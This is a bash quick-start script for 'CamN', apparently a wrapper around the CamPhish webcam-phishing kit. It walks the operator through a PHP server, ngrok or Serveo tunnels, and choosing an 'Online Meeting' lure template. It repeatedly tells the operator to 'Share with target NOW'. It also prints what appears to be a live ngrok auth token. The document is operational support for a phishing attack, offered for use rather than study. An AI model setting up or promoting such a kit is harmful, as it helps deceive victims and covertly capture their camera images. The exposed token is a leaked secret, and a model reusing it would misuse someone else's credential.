#!/bin/bash
# CamN Quick Start - Run this first!

clear
printf "\e[1;94m╔════════════════════════════════════════════════════════════╗\e[0m\n"
printf "\e[1;94m║                  CamN v1.9+ Quick Start                   ║\e[0m\n"
printf "\e[1;94m║                   [NO MORE HANGING!]                      ║\e[0m\n"
printf "\e[1;94m╚════════════════════════════════════════════════════════════╝\e[0m\n\n"

printf "\e[1;92m✓ What's Fixed in v1.9+:\e[0m\n"
printf "  • Real-time progress dots (shows script is working)\n"
printf "  • Network validation BEFORE trying tunnels\n"
printf "  • Fast ngrok timeout (5 seconds)\n"
printf "  • Automatic fallback to Serveo\n"
printf "  • Detailed error messages\n"
printf "  • Link guaranteed in 5-10 seconds\n\n"

printf "\e[1;93m[STEP 1] Quick Environment Check (30 seconds)\e[0m\n"
printf "─────────────────────────────────────────────────\n"
printf "Run this first to make sure everything is working:\n\n"

printf "\e[1;92mbash CamPhish/quick_check.sh\e[0m\n\n"

printf "Expected output:\n"
printf "  [✓] PHP installed: PHP 8.4.11\n"
printf "  [✓] PHP is responding\n"
printf "  [✓] Internet OK\n\n"

printf "\e[1;93m[STEP 2] Run the Main Script\e[0m\n"
printf "─────────────────────────────────────────────────\n"
printf "When ready, run:\n\n"

printf "\e[1;92mpython launcher.py\e[0m\n\n"

printf "Then select:\n"
printf "  [1] AUTO (recommended)\n"
printf "  Enter token: 398ehVXPaY93sAWM4gPqJTVTFCP_6p34c1nsf2LbgoQK9Bcnp\n"
printf "  Choose template: 3 (Online Meeting)\n\n"

printf "\e[1;93m[STEP 3] Watch the Progress\e[0m\n"
printf "─────────────────────────────────────────────────\n"
printf "You'll see:\n\n"

printf "\e[1;92m[+] Starting PHP server on 0.0.0.0:3333\e[0m\n"
printf "\e[1;92m[+] PHP PID: 1234\e[0m\n"
printf "\e[1;92m[✓] PHP server running\e[0m\n"
printf "\e[1;92m[*] Network diagnostics...\e[0m\n"
printf "\e[1;92m[+] Checking PHP on 0.0.0.0:3333...\e[0m\n"
printf "\e[1;92m[✓] PHP is responding\e[0m\n"
printf "\e[1;92m[+] Checking internet...\e[0m\n"
printf "\e[1;92m[✓] Internet OK\e[0m\n"
printf "\e[1;92m[*] Obtaining public link...\e[0m\n"
printf "\e[1;92m[+] Attempting ngrok tunnel...\e[0m\n"
printf "\e[1;92m[+] ngrok: starting (waiting up to 5 seconds): ..... ✓\e[0m\n"
printf "\e[1;92m[✓] ngrok ready: https://abc123.ngrok.io\e[0m\n\n"

printf "\e[1;92m       ↓ YOUR LINK IS READY!\e[0m\n"
printf "\e[1;92m       ↓ Share with target NOW\e[0m\n\n"

printf "\e[1;93m[STEP 4] If It Times Out\e[0m\n"
printf "─────────────────────────────────────────────────\n"
printf "It will automatically fall back to Serveo:\n\n"

printf "\e[1;92m[+] ngrok: starting (waiting up to 5 seconds): ..... ✗\e[0m\n"
printf "\e[1;92m[!] ngrok timeout (5 seconds elapsed)\e[0m\n"
printf "\e[1;92m[+] serveo: starting SSH tunnel (max 10 seconds): ....... ✓\e[0m\n"
printf "\e[1;92m[✓] serveo ready: https://cam12345.serveo.net\e[0m\n\n"

printf "\e[1;92m       ↓ SERVEO LINK IS READY!\e[0m\n"
printf "\e[1;92m       ↓ Share with target NOW\e[0m\n\n"

printf "\e[1;93m[STEP 5] Troubleshooting\e[0m\n"
printf "─────────────────────────────────────────────────\n"
printf "If something goes wrong:\n\n"

printf "\e[1;92m1. Check environment:\e[0m\n"
printf "   bash test_environment.sh\n\n"

printf "\e[1;92m2. Read troubleshooting guide:\e[0m\n"
printf "   cat STUCK_FIX.md\n\n"

printf "\e[1;92m3. Check logs:\e[0m\n"
printf "   cat CamPhish/ngrok.log     (for ngrok issues)\n"
printf "   cat CamPhish/sendlink      (for Serveo issues)\n"
printf "   cat CamPhish/php.log       (for PHP issues)\n\n"

printf "\e[1;93m[EXPECTED BEHAVIOR]\e[0m\n"
printf "─────────────────────────────────────────────────\n"
printf "✓ PHP starts (see PID)\n"
printf "✓ Network checks pass\n"
printf "✓ Ngrok/Serveo dots appear (one per second)\n"
printf "✓ Link appears within 5-10 seconds\n"
printf "✓ NO MORE SILENT HANGING\n\n"

printf "\e[1;93m[QUICK SUMMARY]\e[0m\n"
printf "─────────────────────────────────────────────────\n"
printf "\e[1;92mOLD (v1.8):  \e[0m[+] PHP started ... [STUCK FOR 20+ SECONDS]\n"
printf "\e[1;92mNEW (v1.9+): \e[0m[+] PHP started ... [DOT DOT DOT] [LINK IN 5-10 SEC]\n\n"

printf "\e[1;92m[✓] You're ready! Let's go:\e[0m\n"
printf "\e[1;92mbash CamPhish/quick_check.sh && python launcher.py\e[0m\n\n"

printf "\e[1;94m════════════════════════════════════════════════════════════\e[0m\n"
printf "\e[1;92mVersion: 1.9+ (2025)\e[0m\n"
printf "\e[1;92mStatus: Fixed - No more hanging\e[0m\n"
printf "\e[1;94m════════════════════════════════════════════════════════════\e[0m\n\n"
